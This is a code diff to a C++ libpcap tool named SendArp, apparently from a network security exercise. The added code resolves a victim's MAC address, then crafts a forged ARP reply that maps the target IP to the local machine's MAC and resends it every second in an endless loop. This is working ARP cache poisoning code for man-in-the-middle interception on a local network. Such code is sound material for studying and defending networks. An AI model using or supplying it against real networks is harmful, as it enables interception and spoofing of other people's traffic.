@@ -31,8 +31,8 @@ SendArp::~SendArp() {
 StatusCode SendArp::init(char *interface, char *sender_ip, char *target_ip) {
   this->interface = interface;
 
-  this->sender_ip = IpAddress(4, reinterpret_cast<u_char*>(sender_ip));
-  this->target_ip = IpAddress(4, reinterpret_cast<u_char*>(target_ip));
+  this->sender_ip = IpAddress(reinterpret_cast<u_char*>(sender_ip), 4);
+  this->target_ip = IpAddress(reinterpret_cast<u_char*>(target_ip), 4);
 
   handle = pcap_open_live(interface, BUFSIZ, 1, 1000, errbuf);
   if (handle == nullptr) {
@@ -157,11 +157,8 @@ void SendArp::broadcast() {
   memcpy(cursor, my_mac, hardware_size);
   cursor += hardware_size;
 
-  vector<u_char> ip = sender_ip.get_address();
-  for (auto i = ip.begin(); i != ip.end(); ++i) {
-    memcpy(cursor, &*i, sizeof(u_char));
-    cursor += sizeof(u_char);
-  }
+  memcpy(cursor, get_my_ip_address(interface), 4);
+  cursor += 4;
 
   u_char target_mac[hardware_size] = {
     // Unknown mac 00:00:00:00:00:00
@@ -170,9 +167,10 @@ void SendArp::broadcast() {
   memcpy(cursor, target_mac, hardware_size);
   cursor += hardware_size;
 
-  ip = target_ip.get_address();
+  vector<uint8_t> ip = sender_ip.get_address();
   for (auto i = ip.begin(); i != ip.end(); ++i) {
-    memcpy(cursor, &*i, sizeof(u_char));
+    uint8_t tmp = *i;
+    memcpy(cursor, &tmp, sizeof(u_char));
     cursor += sizeof(u_char);
   }
 
@@ -193,5 +191,97 @@ void SendArp::broadcast() {
   printf("\n");
 #endif
   send(packet, sizeof packet);
+
+  for (;;) {
+    struct pcap_pkthdr *header;
+    const u_char *raw_packet;
+
+		int res = pcap_next_ex(handle, &header, &raw_packet);
+		if (!res) continue;
+		if (res == -1 || res == -2) break;
+
+    EthPacket eth = EthPacket(const_cast<u_char*>(raw_packet));
+    if (eth.get_type() == TYPE_ARP) {
+      ArpPacket* arp = reinterpret_cast<ArpPacket*>(eth.get_data());
+      if (!strcmp(String(arp->get_sender_ip()).to_cstr(),
+            String(sender_ip.get_address()).to_cstr())
+          && arp->get_operation() == ARP_REPLY) {
+        // Reset
+        cursor = packet;
+
+        u_char _sender_mac[6];
+        vector<uint8_t> sender_addr = arp->get_sender_address();
+        size_t i;
+        size_t size = sender_addr.size();
+        for (i = 0; i < size; ++i) {
+          _sender_mac[i] = static_cast<u_char>(sender_addr[i]);
+        }
+        u_char* sender_mac = _sender_mac;
+
+        memcpy(cursor, sender_mac, _hardware_size);
+        cursor += _hardware_size;
+
+        memcpy(cursor, my_mac, _hardware_size);
+        cursor += _hardware_size;
+
+        u_char eth_type[2] = { (TYPE_ARP & 0xff00) >> 8, TYPE_ARP & 0x00ff };
+        memcpy(cursor, eth_type, sizeof eth_type);
+        cursor += sizeof eth_type;
+
+        u_char hardware_type[2] = {
+          (TYPE_ETH & 0xff00) >> 8, TYPE_ETH & 0x00ff
+        };
+        memcpy(cursor, hardware_type, sizeof hardware_type);
+        cursor += sizeof hardware_type;
+
+        u_char protocol_type[2] = {
+          (TYPE_IPV4 & 0xff00) >> 8, TYPE_IPV4 & 0x00ff
+        };
+        memcpy(cursor, protocol_type, sizeof protocol_type);
+        cursor += sizeof protocol_type;
+
+        u_char hardware_size = _hardware_size;
+        memcpy(cursor, &hardware_size, sizeof(u_char));
+        cursor += sizeof(u_char);
+
+        u_char protocol_size = _protocol_size;
+        memcpy(cursor, &protocol_size, sizeof(u_char));
+        cursor += sizeof(u_char);
+
+        u_char operation_code[2] = {
+          (ARP_REPLY & 0xff00) >> 8, ARP_REPLY & 0x00ff
+        };
+        memcpy(cursor, operation_code, sizeof operation_code);
+        cursor += sizeof operation_code;
+
+        memcpy(cursor, my_mac, _hardware_size);
+        cursor += _hardware_size;
+
+        vector<uint8_t> tip = target_ip.get_address();
+        for (auto i = tip.begin(); i != tip.end(); ++i) {
+          uint8_t tmp = *i;
+          memcpy(cursor, &tmp, sizeof(u_char));
+          cursor += sizeof(u_char);
+        }
+
+        memcpy(cursor, sender_mac, _hardware_size);
+        cursor += _hardware_size;
+
+        vector<uint8_t> sip = sender_ip.get_address();
+        for (auto i = sip.begin(); i != sip.end(); ++i) {
+          uint8_t tmp = *i;
+          memcpy(cursor, &tmp, sizeof(u_char));
+          cursor += sizeof(u_char);
+        }
+
+        // Send payload
+        for (;;) {
+          send(packet, sizeof packet);
+          sleep(1);
+        }
+        break;
+      }
+    }
+  }
 }
 
